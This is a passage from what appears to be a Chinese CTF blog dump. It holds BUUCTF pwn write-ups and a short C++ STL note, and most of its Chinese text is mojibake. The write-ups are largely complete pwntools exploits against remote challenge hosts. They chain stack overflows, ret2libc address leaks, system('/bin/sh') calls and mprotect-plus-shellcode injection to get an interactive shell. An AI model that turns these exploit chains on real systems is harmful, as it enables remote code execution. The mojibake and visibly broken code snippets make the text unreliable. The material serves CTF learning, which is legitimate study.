0x03é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œbufå’Œsæ•°ç»„å®Œå…¨ç›¸ç­‰æ—¶ï¼Œstrncmpå‡½æ•°è¿”å›0ï¼Œä½†æ˜¯sprinfå‡½æ•°å°†éšæœºæ•°åŠ åˆ°äº†sæ•°ç»„ä¸­ï¼Œbufä¸så¾ˆéš¾ç›¸ç­‰ã€‚ä¸è¿‡åœ¨v1ä¸º0çš„æ—¶å€™strncmpå‡½æ•°ä¹Ÿæ˜¯ä¼šè¿”å›0çš„ï¼Œè€Œv1æ˜¯è¯»å–çš„bufçš„å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶bufçš„ç¬¬ä¸€ä½ä¸ºâ€™\\x00â€™ï¼Œå¯èµ·åˆ°æˆªæ–­å­—ç¬¦ä¸²é•¿åº¦çš„æ•ˆæœã€‚ ç¬¬äºŒæ­¥ï¼Œè‹¥è¦åˆ©ç”¨æ ˆæº¢å‡ºret2libcæ³„éœ²writeå‡½æ•°åœ°å€çš„è¯ï¼Œèµ·ç éœ€è¦231+4+4*5 = 255ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è®©buf[7] = â€˜\\xffâ€™å³å¯ã€‚ä»£ç ä¸­çš„buf[v5-1] = 0æ”¹å˜çš„æ˜¯å­—ç¬¦ä¸²æœ«å°¾â€™\\x00â€™çš„å€¼ï¼Œä¸å½±å“buf[7] ã€‚ æ‰€ä»¥ç¬¬ä¸€æ¬¡è¯»å–çš„payloadä¸º payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") 0x04æ³¨æ„æœ¬é¢˜æä¾›äº†libcï¼Œç›´æ¥ä½¿ç”¨pwntoolså·¥å…·å³å¯ï¼Œä¸å¿…ä½¿ç”¨LibcSearcher mainå‡½æ•°åœ°å€ç”¨elf.sym[â€˜mainâ€™]æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œobjdump -tå‘½ä»¤æŸ¥çœ‹å‘ç°ç¨‹åºæ²¡æœ‰ç¬¦å·è¡¨ï¼ŒåŸå› åº”è¯¥æ˜¯å‡ºé¢˜äººä½¿ç”¨stripå‘½ä»¤å»ç¬¦å·è¡¨äº† å®Œæ•´exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') p = remote('node4.buuoj.cn',28188) #p = process('./pwn') elf = ELF('./pwn') libc = ELF('libc-2.23.so') payload = b'\\x00'+b'\\xff'*7 p.sendline(payload) p.recvuntil(\"Correct\\n\") write_plt = elf.plt[\"write\"] write_got = elf.got[\"write\"] #main_addr = elf.plt['__libc_start_main'] main_addr = 0x8048825 payload1 = b'a'*0xe7+b'a'*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) p.sendline(payload1) write_addr = u32(p.recv(4)) #print(hex(write_addr)) libc_base = write_addr - libc.sym[\"write\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() p.sendline(payload) p.recvuntil(\"Correct\\n\") payload2 = b'a'*0xe7+b'a'*4+p32(system_addr)+p32(0)+p32(bin_sh_addr) p.sendline(payload2) p.interactive() é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_ropç»å…¸ret2libc3 exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn') p = remote('node4.buuoj.cn',28146) elf = ELF('./pwn') main_addr = elf.sym['main'] plt_addr = elf.plt['write'] got_addr = elf.got['write'] pay1 = b'a'*(0x88+4)+p32(plt_addr)+p32(main_addr)+p32(1)+p32(got_addr)+p32(0xD) p.sendline(pay1) write_addr = u32(p.recv()[0:4])#0xf7db1190 print(\"write_addr = \",hex(write_addr)) libc=LibcSearcher('write',write_addr) offset=write_addr-libc.dump('write') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x88+4)+p32(system)+b'aaaa'+p32(binsh) p.sendline(pay2) p.interactive() pwn2_sctf_20160x0132ä½å¼€NXæ³„éœ²libc æ³¨æ„get_næ˜¯è‡ªå®šä¹‰å‡½æ•° è§„å®šè¯»å…¥v2é•¿åº¦çš„å­—ç¬¦ï¼Œä½†æ˜¯ç¨‹åºè¦æ±‚v2ä¸å¤§äº32ã€‚è§‚å¯Ÿåˆ°intå‹çš„v2ä¼ å…¥unsigned intå‹çš„a2ï¼Œå¯ä»¥ä¼ å…¥-1æ•´æ•°æº¢å‡ºç»•è¿‡ã€‚ ROPé“¾æ³„éœ²libcï¼Œæº¢å‡ºè¦†ç›–è¿”å›åœ°å€getshell 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn0') p = remote('node4.buuoj.cn',26602) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') libc = ELF('./libc-2.23.so') elf = ELF('./pwn0') main_addr = elf.sym['main'] plt_addr = elf.plt['printf'] got_addr = elf.got['getchar'] fmt = 0x080486F #ç¬¬ä¸€è¡Œçš„æ‰æ­£ç¡®ï¼Ÿ pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr) p.recvuntil(b\"\\n\") p.sendline(pay1) getchar_addr= u32(p.recvuntil(b'\\xf7')[-4:]) #getchar_addr = u32(p.recv()[0:4])å˜æˆæ¥æ”¶å‰é¢å››ä¸ªå­—èŠ‚äº† print(\"getchar_addr = \",hex(getchar_addr)) ''' libc=LibcSearcher('getchar',getchar_addr) offset=getchar_addr-libc.dump('getchar') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') ''' base_addr = getchar_addr - libc.symbols['getchar'] system = libc.symbols['system'] + base_addr binsh = libc.search(b'/bin/sh').__next__() + base_addr print(\"libc_base_addr = \",hex(base_addr)) #print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x2c+4)+p32(system)+b'aaaa'+p32(binsh) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') p.recvuntil(b\"\\n\") p.sendline(pay2) p.interactive() bjdctf_2020_babyrop0x0164ä½ï¼Œä¸32ä½ä¼ å‚æœ‰åŒºåˆ« æ€è·¯ï¼š åˆ©ç”¨putså‡½æ•°æ³„éœ²å‡ºputså‡½æ•°çœŸå®åœ°å€ é€šè¿‡putså‡½æ•°åœ°å€è®¡ç®—å‡ºlibcåŸºåœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºsystemå’Œbinshçš„çœŸå®åœ°å€ æ„é€ ropé“¾æ ˆæº¢å‡ºgetshell putså‡½æ•°é€šè¿‡pop rdi ; ret ä¼ å‚ ç”¨ROPgadgetå¯ä»¥æ‰¾åˆ° 0x02exp #encoding = utf-8 from pwn import * from LibcSearcher import * context(os = 'linux',arch = 'amd64',log_level = 'debug') content = 1 elf = ELF('./pwn') def main(): if content == 1: p = process('./pwn') else: p = remote('node4.buuoj.cn',29917) #elf main_addr = elf.sym['main'] plt_addr = elf.plt['puts'] got_addr = elf.got['puts'] pop_rdi = 0x0400733 ret_addr = 0x04004c9 payload = b'a'*(0x20+0x8) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print(hex(puts_addr)) #libc lib = LibcSearcher('puts',puts_addr) lib_puts_addr = lib.dump('puts') lib_system_addr = lib.dump('system') lib_bin_addr = lib.dump('str_bin_sh') #base base_addr = puts_addr - lib_puts_addr system_addr = base_addr + lib_system_addr bin_addr = base_addr + lib_bin_addr payload = b'a'*(0x20+0x8) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) p.interactive() main() [HarekazeCTF2019]baby_rop264ä½çš„ret2libc3 0x01 åˆ©ç”¨printfæ³„éœ²libcç‰ˆæœ¬å’ŒåŸºåœ°å€ï¼Œä¼ å‚çš„æ—¶å€™éœ€è¦ä¼ å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²%sç»™å¯„å­˜å™¨rdiï¼ˆç¨‹åºä¸­ç¬¬äºŒä¸ªprintfå‡½æ•°è‡ªå¸¦ï¼Œè¿”å›è‡³è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€å³å¯ï¼‰ï¼›å¹¶å°†æƒ³è¦æ³„éœ²çš„read_gotä¼ ç»™å¯„å­˜å™¨ã€‚ 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='amd64', log_level='debug') p = remote('node4.buuoj.cn',25502) #p = process('./babyrop2') elf = ELF('./babyrop2') libc = ELF('libc.so.6') #ä¸€å®šè¦ç”¨é¢˜ç›®ç»™çš„libcæ–‡ä»¶ï¼Œå¯èƒ½å¿…é¡»è¦ç”¨é¢˜ç›®ç»™çš„æ‰èƒ½æ‰“é€š printf_plt = elf.plt['printf'] read_got = elf.got['read'] main_plt = elf.sym['main'] pop_rdi = 0x0000000000400733 pop_rsi_r15 = 0x0000000000400731 fmt = 0x0000000000400790 payload1 = b'a'*(0x20+8)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt) p.recvuntil(\"name? \") p.sendline(payload1) read_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) print(\"read_addr ======>> \"+hex(read_addr)) libc_base = read_addr - libc.sym[\"read\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() payload2 = b'a'*0x28+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(0) p.sendline(payload2) p.interactive()","categories":[{"name":"collections","slug":"collections","permalink":"http://lmarch2.github.io/categories/collections/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"}]},{"title":"C++STL å­¦ä¹ ç¬”è®°","slug":"C++STL å­¦ä¹ ç¬”è®°","date":"2023-08-29T12:37:51.000Z","updated":"2024-02-04T06:46:12.338Z","comments":true,"path":"posts/45592537/","link":"","permalink":"http://lmarch2.github.io/posts/45592537/","excerpt":"","text":"C++STL å­¦ä¹ ç¬”è®°è®°å½•ä¸€äº›æ•°æ®ç»“æ„è¯¾å¤–å­¦ä¹ STLå®¹å™¨ä½¿ç”¨çš„ç¬”è®°ï¼Œå½“ä¸ªå­—å…¸ç”¨å§å˜¿å˜¿~~ STLè¡¥å…… List é“¾è¡¨ vector å­˜æ”¾ä»»æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„ STLå®¹å™¨é€‚é…å™¨ stack queue priority_queue deque heap pair è¿­ä»£å™¨ç±»å‹è¡¥å…… STLå¯¹äºç©ºé—´å¤§å°çš„è§„å®š STLè¡¥å……List é“¾è¡¨ list&lt;int&gt; mylist = { }é“¾è¡¨å®šä¹‰å’Œåˆå§‹åŒ– void push_front(const T &amp; val) å°† val æ’å…¥é“¾è¡¨æœ€å‰é¢ void pop_front() åˆ é™¤é“¾è¡¨æœ€å‰é¢çš„å…ƒç´  list.push_back() å¢åŠ ä¸€ä¸ªæ–°çš„å…ƒç´ åœ¨ list çš„å°¾ç«¯ list.pop_back() åˆ é™¤ list çš„æœ€æœ«ä¸ªå…ƒç´  void sort() å°†é“¾è¡¨ä»å°åˆ°å¤§æ’åº reverse()åè½¬é“¾è¡¨ list.empty() è‹¥listå†…éƒ¨ä¸ºç©ºï¼Œåˆ™å›ä¼ trueå€¼ list.size() å›ä¼ listå†…å®é™…çš„å…ƒç´ ä¸ªæ•° list.front() å­˜å–ç¬¬ä¸€ä¸ªå…ƒç´  list.back() å­˜å–æœ€æœ«ä¸ªå…ƒç´  mylist.begin() é¦–ä½è¿­ä»£å™¨ mylist.end()æœ«ä½è¿­ä»£å™¨ å¸¸è§forå¾ªç¯ for (auto it = mylist.begin(); it != mylist.end(); ++it) `cout &lt;&lt; *it &lt;&lt; \" \";` itæ˜¯è¿­ä»£å™¨æŒ‡é’ˆï¼Œä¸èƒ½èµ‹å€¼ï¼Œä¸èƒ½è¿ç®—ï¼ˆ+=ä¸è¡Œï¼‰ï¼Œåªèƒ½++ listçš„è¿­ä»£å™¨åªæ”¯æŒåŒå‘è®¿é—®ï¼Œä¸æ”¯æŒéšæœºè®¿é—®ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥è¿›è¡ŒåŠ å‡æ“ä½œ ï¼ˆå’Œvectorç­‰åŒºåˆ«ï¼‰ advance(it, n); å°†è¿­ä»£å™¨itå‘å‰ç§»åŠ¨nä¸ªä½ç½® mylist.insert(it, k); å‘ç¬¬itä½è¿­ä»£å™¨ä½ç½®æ’å…¥æ–°å…ƒç´ kï¼ˆitä¹‹å‰ï¼‰ mylist.erase(it); åˆ é™¤ç¬¬itä½è¿­ä»£å™¨ä½ç½®æ‰€æŒ‡å…ƒç´  mylist.erase(it, it + n); åˆ é™¤ç¬¬itä½åˆ°ç¬¬it+nä½å…ƒç´ ï¼ˆä¸€å…±åˆ é™¤ä»itå¼€å§‹åˆ°it+nçš„nä¸ªå…ƒç´ ï¼‰ next(it,n)å‡½æ•°æ˜¯C++ STLä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„è¿­ä»£å™¨ï¼Œè¯¥è¿­ä»£å™¨æŒ‡å‘åŸå§‹è¿­ä»£å™¨å‘å‰æˆ–å‘åç§»åŠ¨æŒ‡å®šè·ç¦»åçš„ä½ç½® ï¼Œè¢«ç”¨æ¥ç§»åŠ¨itè¿­ä»£å™¨åˆ°ä¸‹nä½ vector å­˜æ”¾ä»»æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„ vector&lt;T&gt;(nSize,t)åˆ›å»ºä¸€ä¸ªvectorï¼Œå…ƒç´ ä¸ªæ•°ä¸ºnSize,ä¸”å€¼å‡ä¸ºt vector.push_back(k) åœ¨vectorå°¾éƒ¨æ’å…¥å…ƒç´ k vector.insert(vector.begin() + 1, 2) åœ¨vectorçš„ç¬¬2ä¸ªä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ 2 vector.pop_back() åˆ é™¤vectorå°¾éƒ¨çš„ä¸€ä¸ªå…ƒç´  vector.erase(v.begin() + 1) åˆ é™¤vectorçš„ç¬¬2ä¸ªå…ƒç´  erase()æ–¹æ³•æ¥å—ä¸¤ä¸ªè¿­ä»£å™¨å‚æ•°ï¼Œè¡¨ç¤ºè¦åˆ é™¤çš„åŒºé—´çš„èµ·å§‹ä½ç½®å’Œç»“æŸä½ç½®ã€‚è¢«åˆ é™¤çš„åŒºé—´åŒ…æ‹¬èµ·å§‹ä½ç½®çš„å…ƒç´ ï¼Œä½†ä¸åŒ…æ‹¬ç»“æŸä½ç½®çš„å…ƒç´ ã€‚ vector.[0]; è®¿é—®vectorçš„ç¬¬1ä¸ªå…ƒç´  ï¼Œ å¯è¿›è¡Œèµ‹å€¼ç­‰æ“ä½œ vector.at(0); /è®¿é—®vectorçš„ç¬¬1ä¸ªå…ƒç´ ï¼Œå¦‚æœè¶Šç•Œä¼šæŠ›å‡ºå¼‚å¸¸ for (int i = 0; i &lt; v.size(); i++) { cout &lt;&lt; v[i] &lt;&lt; \" \"; } éå†vector vector.resize() æ”¹å˜å®é™…å…ƒç´ çš„ä¸ªæ•°ï¼Œæ–°æ·»åŠ çš„å…ƒç´ ä¼šè¢«é»˜è®¤åˆå§‹åŒ– vector.size() è·å–vectorçš„å¤§å° ï¼Œè¿™æ˜¯å½“å‰å­˜å‚¨çš„å…ƒç´ æ•°é‡ vector.capacity()è¿”å›å½“å‰å®¹é‡ï¼Œè¿™æ˜¯ç›®å‰å®¹å™¨æœ€å¤šå‚¨å­˜çš„å…ƒç´ æ•°é‡ vector.front() è¿”å›ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ vector.back()è¿”å›æœ€åä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ vector.begin()è¿”å›æŒ‡å‘å®¹å™¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨ vector.end()è¿”å›æŒ‡å‘å®¹å™¨æœ€åä¸€ä¸ªå…ƒç´ æ‰€åœ¨ä½ç½®åä¸€ä¸ªä½ç½®çš„è¿­ä»£å™¨ï¼Œé€šå¸¸å’Œ begin() ç»“åˆä½¿ç”¨ vector.empty()åˆ¤æ–­ä¸€ä¸ªvectoræ˜¯å¦ä¸ºç©º STLå®¹å™¨é€‚é…å™¨stack stack&lt;T&gt; åˆ›å»ºæ ˆå¯¹è±¡ push(element)ï¼šå°†å…ƒç´ å‹å…¥æ ˆé¡¶ pop()ï¼šå¼¹å‡ºæ ˆé¡¶å…ƒç´  top()ï¼šè¿”å›æ ˆé¡¶å…ƒç´  empty()ï¼šè¿”å›æ ˆæ˜¯å¦ä¸ºç©º size()ï¼šè¿”å›æ ˆä¸­å…ƒç´ çš„æ•°é‡ æ¸…ç©ºæ ˆæ“ä½œï¼š while (!myStack.empty()) { myStack.pop(); } queue queue &lt;int&gt; åˆ›å»ºqueueå¯¹è±¡ push(element)ï¼šå°†å…ƒç´ æ·»åŠ åˆ°é˜Ÿåˆ—çš„æœ«å°¾ pop()ï¼šä»é˜Ÿåˆ—çš„å¤´éƒ¨å–å‡ºå…ƒç´ ï¼Œå¹¶å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ front()ï¼šè¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ï¼Œä½†ä¸å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ back()ï¼šè¿”å›é˜Ÿåˆ—æœ«å°¾çš„å…ƒç´ ï¼Œä½†ä¸å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ size()ï¼šè¿”å›é˜Ÿåˆ—ä¸­å…ƒç´ çš„æ•°é‡ empty()ï¼šåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º priority_queue push(element)ï¼šå°†å…ƒç´ æ·»åŠ åˆ°ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼Œæ ¹æ®ä¼˜å…ˆçº§é¡ºåºæ’åˆ—ã€‚ pop()ï¼šä»ä¼˜å…ˆé˜Ÿåˆ—ä¸­å–å‡ºä¼˜å…ˆçº§æœ€é«˜çš„å…ƒç´ ï¼Œå¹¶å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚ top()ï¼šè¿”å›ä¼˜å…ˆé˜Ÿåˆ—ä¸­ä¼˜å…ˆçº§æœ€é«˜çš„å…ƒç´ ï¼Œä½†ä¸å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚ size()ï¼šè¿”å›ä¼˜å…ˆé˜Ÿåˆ—ä¸­å…ƒç´ çš„æ•°é‡ã€‚ empty()ï¼šåˆ¤æ–­ä¼˜å…ˆé˜Ÿåˆ—æ˜¯å¦ä¸ºç©º priority_queue&lt;int, std::vector&lt;int&gt;, std::less&lt;int&gt;&gt; myMaxHeap;åˆ›å»ºå¤§é¡¶å † less&lt;int&gt;æ˜¯priority_queueçš„é»˜è®¤æ¯”è¾ƒå‡½æ•°ï¼Œå› æ­¤åœ¨åˆ›å»ºå¤§é¡¶å †æ—¶å¯ä»¥çœç•¥ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ä»¥ä¸‹æ˜¯æ›´ç®€æ´çš„è¡¨è¾¾å¼ï¼špriority_queue&lt;int&gt; myMaxHeap; priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; myMinHeap; åˆ›å»ºå°é¡¶å † priority_queue&lt;int, vector&lt;int&gt;,greater&lt;int&gt;&gt; æŒ‡å®šäº†ä½¿ç”¨greater&lt;int&gt; ä½œä¸ºæ¯”è¾ƒå‡½æ•°ï¼Œå› æ­¤åˆ›å»ºçš„ä¼˜å…ˆé˜Ÿåˆ—æ˜¯å‡åºçš„ï¼Œå³ä¼˜å…ˆçº§æ•°å€¼å°çš„å…ƒç´ æ’åœ¨é˜Ÿåˆ—å‰é¢ã€‚å¦‚æœæƒ³è¦åˆ›å»ºé™åºçš„ä¼˜å…ˆé˜Ÿåˆ—ï¼Œå¯ä»¥ä½¿ç”¨ less&lt;int&gt; ä½œä¸ºæ¯”è¾ƒå‡½æ•°ï¼Œä¾‹å¦‚ priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt; EG: ä¼˜å…ˆé˜Ÿåˆ—å®ç°æ»‘åŠ¨çª—å£æ±‚æœ€å¤§å€¼ int main() { int k; // æ»‘åŠ¨çª—å£å¤§å° int n; cin >> n >> k; vector nums(n); // è¾“å…¥æ•°ç»„ priority_queue pq; // å®šä¹‰ä¼˜å…ˆé˜Ÿåˆ—ï¼Œå­˜æ”¾æ•°å€¼å’Œä¸‹æ ‡ for (int i = 0; i < nums.size(); i++) cin >> nums[i]; // å…ˆå°†å‰ k ä¸ªå…ƒç´ åŠ å…¥ä¼˜å…ˆé˜Ÿåˆ— for (int i = 0; i < k; i++) { pq.push({ nums[i], i }); } // è¾“å‡ºç¬¬ä¸€ä¸ªæ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼ cout < pq.top().first < \" \"; // æ»‘åŠ¨çª—å£å‘å³ç§»åŠ¨ï¼Œæ¯æ¬¡åŠ å…¥ä¸€ä¸ªæ–°å…ƒç´ ï¼Œå¼¹å‡ºä¸€ä¸ªæ—§å…ƒç´  for (int i = k; i < nums.size(); i++) { pq.push({ nums[i], i }); // åŠ å…¥æ–°å…ƒç´  while (pq.top().second","categories":[{"name":"notes","slug":"notes","permalink":"http://lmarch2.github.io/categories/notes/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://lmarch2.github.io/tags/C/"}]},{"title":"è¿œå¤BUUCTFçš„wp","slug":"è¿œå¤BUUCTFçš„wp","date":"2023-08-28T14:37:09.000Z","updated":"2024-02-04T06:46:08.370Z","comments":true,"path":"posts/de339b6d/","link":"","permalink":"http://lmarch2.github.io/posts/de339b6d/","excerpt":"","text":"æ¬è¿ï¼ŒBUUCTFçš„pwnéƒ¨åˆ†é¢˜è§£ not_the_same_3dsctf_2016 0X01 0x02 ciscn_2019_n_8 get_started_3dsctf_2016 0x00 0x01 0x02 0x03 0x04 ciscn_2019_c_1 0x01 0x02 0x03 0x04 0x05 [OGeek2019]babyrop 0x01 0x02 0x03 0x04 ciscn_2019_es_2 0x01 0x02 ç¬¬ä¸€æ­¥ï¼Œæ³„éœ²å‡ºebpï¼Œé€šè¿‡ebp+åç§»é‡çš„æ–¹æ³•è®¡ç®—æ ˆä¸Šåœ°å€ ç¬¬äºŒæ­¥ æ ˆè¿ç§» 0x03 0x04 é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop pwn2_sctf_2016 0x01 0x02 bjdctf_2020_babyrop 0x01 0x02 [HarekazeCTF2019]baby_rop2 0x01 0x02 jarvisoj_fm ciscn_2019_s_3 0x01 0x02 0x03 ç¬¬ä¸€ç§åšæ³•ï¼šret2csuæ§åˆ¶æ‰§è¡Œexecve ç¬¬äºŒç§ï¼šSROP not_the_same_3dsctf_20160X01å’Œget_started_3dsctf_2016ç±»ä¼¼ å¤§æ¦‚æ€è·¯æ˜¯å…ˆæ§åˆ¶ç¨‹åºæµåˆ°get_secretå‡½æ•°è¯»å–flagåˆ°f14gå˜é‡ï¼Œå†æ§åˆ¶è¿”å›åœ°å€ä¸ºwriteå‡½æ•°è¾“å‡ºf14gå˜é‡çš„å†…å®¹ from pwn import * p = remote(\"node4.buuoj.cn\",25684) elf= ELF(./not_the_same_3dsctf_2016) write_addr = elf.sym['write'] flag_addr = 0x080ECA2D get_secret = 0x080489A0 payload='a'* 0x2d + p32(get_secret) + p32(write_addr) + p32(0) + p32(1) + p32(flag_addr) + p32(45) p.sendline(payload) p.interactive() 0x02ç¬¬äºŒç§æ€è·¯ ç”¨mprotectå‡½æ•°ä¿®æ”¹.plt.gotè¡¨å†…å­˜é¡µæƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç”¨readå‡½æ•°å°†shellcodeæ³¨å…¥åˆ°åˆšæ‰ä¿®æ”¹çš„å†…å­˜é¡µä¸­ï¼Œæ‰§è¡Œshellcode from pwn import * sh = remote(\"node4.buuoj.cn\",25684) elf= ELF(./not_the_same_3dsctf_2016) pop3_ret = 0x0804f420#gadget:pop ebx; pop esi; pop ebp; ret;ç”¨æ¥å‘mprotect()ã€read()ä¼ å‚ #ROPgadget --binary get_started --only 'pop|ret' | grep pop #ä¸ºäº†åç»­å†èƒ½ä½¿ç”¨æ ˆret,æˆ‘ä»¬å¾—æ„é€ ä¸€ä¸‹æ ˆçš„å¸ƒå±€,å› ä¸ºmprotectå‡½æ•°ä½¿ç”¨åˆ°äº†3ä¸ªå‚æ•°,æˆ‘ä»¬å°±æ‰¾å­˜åœ¨3ä¸ªè¿ç»­popçš„æŒ‡ä»¤ï¼Œä¸ºå•¥è¦æ‰¾3ä¸ªpop,ä¹Ÿå°±æ˜¯åœ¨æ­£å¸¸æƒ…å†µä¸‹,å‡½æ•°ä¼ å‚æ˜¯ä½¿ç”¨pushï¼Œæ‰€ä»¥è¦ä¸ºäº†å †æ ˆè¿˜åŸ,å‡½æ•°è°ƒç”¨ç»“æŸæ—¶å°±ä½¿ç”¨popæ¥ä¿è¯å †æ ˆå®Œå¥½. mem_addr = 0x80eb000 #å¯è¯»å¯å†™çš„å†…å­˜,ä½†ä¸å¯æ‰§è¡Œ mem_size = 0x1000 #é€šè¿‡è°ƒè¯•å‡ºæ¥çš„å€¼ mem_proc = 0x7 #å¯ä»£è¡¨å¯è¯»å¯å†™å¯æ‰§è¡Œ mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] ''' ä¸ºäº†è¿ç»­åœ¨å †æ ˆä¸­æ‰§è¡Œ,å°±æ˜¯ç”¨pop3_retæ¥æ§åˆ¶esp,ä½¿å®ƒå¾€ä¸‹å¼¹æ‰å·²ç”¨çš„3ä¸ªå€¼. ''' payload = 'A' * 45 #å¡«å……æ•°æ®è¦†ç›–åˆ°ebp payload += p32(mprotect_addr) #æ ˆè¿”å›åˆ°mprotect()å‡½æ•°æ‰§è¡Œ payload += p32(pop3_ret) #æ‰§è¡Œå®Œmprotectçš„è¿”å›åœ°å€,ä½¿espå¾€ä¸‹+12 #mprotect çš„ä¸‰ä¸ªå‚æ•° mprotect(0x080ea000,0x1000,0x7) payload += p32(mem_addr) #mprotectå‡½æ•°å‚æ•°1 ä¿®æ”¹çš„å†…å­˜åœ°å€ payload += p32(mem_size) #mprotectå‡½æ•°å‚æ•°2 ä¿®æ”¹çš„å†…å­˜å¤§å° payload += p32(mem_proc) #mprotectå‡½æ•°å‚æ•°3 ä¿®æ”¹çš„æƒé™ payload += p32(read_addr) #æ‰§è¡Œå®Œpop3_retåå¼¹åˆ°readåœ°å€ payload += p32(pop3_ret) #æ‰§è¡Œå®Œreadåå°†è¿”å›åˆ°pop3_retæŒ‡ä»¤,åˆç»§ç»­ä½¿esp+12 #read çš„ä¸‰ä¸ªå‚æ•° read(0,0x080ea000,0x100) payload += p32(0) #readå‡½æ•°å‚æ•°1 ,ä»è¾“å…¥ç«¯è¯»å–ï¼Œå°†æˆ‘ä»¬ç”Ÿæˆçš„shellcodeè¯»å…¥ç›®æ ‡å†…å­˜åœ°å€ payload += p32(mem_addr) #è¯»å–åˆ°çš„å†…å®¹å¤åˆ¶åˆ°æŒ‡å‘çš„å†…å­˜é‡Œ payload += p32(0x100) #è¯»å–å¤§å° payload += p32(mem_addr) #æ‰§è¡Œå®Œreadåret esiï¼Œè¿™é‡Œæ˜¯è¿”å›åˆ°æˆ‘ä»¬å¸ƒç½®çš„shellcodeæ‰§è¡Œ sh.sendline(payload) payload_shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') sh.sendline(payload_shellcode) sh.interactive() ciscn_2019_n_8 åªéœ€è¦æ»¡è¶³var[13] == 17å³å¯getshellï¼›__isoc99_scanf()`å‡½æ•°æ²¡æœ‰é™åˆ¶è¾“å…¥æ•°æ®çš„é•¿åº¦ exp from pwn import * context(log_level='debug') sh = remote('node4.buuoj.cn',25951) payload = 'a'*4*13 + p32(17) #p32(17)=\\x11\\x00\\x00\\x00,16è¿›åˆ¶å°ç«¯å­˜å‚¨ï¼Œ0x11(16)=17(10) #è¿™é‡Œ*4æ˜¯å› ä¸º4å­—èŠ‚çš„æ•°ç»„æ¯ä¸€é¡¹è¦4å­—èŠ‚æ‰èƒ½å¡«æ»¡ï¼Œ*13æ˜¯æŠŠæ•°ç»„å‰13é¡¹å¡«æ»¡ï¼Œç¬¬14é¡¹ç”¨ sh.sendlineafter(\"What's your name?\\n\",payload) sh.interactive() get_started_3dsctf_20160x00æœ€è¿‘æŒç»­å­¦ä¹ æ ˆæº¢å‡ºï¼ŒåŠªåŠ›ç†Ÿæ‚‰å„ç§åˆ©ç”¨æ–¹æ³•ï¼Œäº‰å–è¿™å‘¨å’Œä¸‹å‘¨æŠŠæ ˆæº¢å‡ºè¿™å—ç»“æŸ 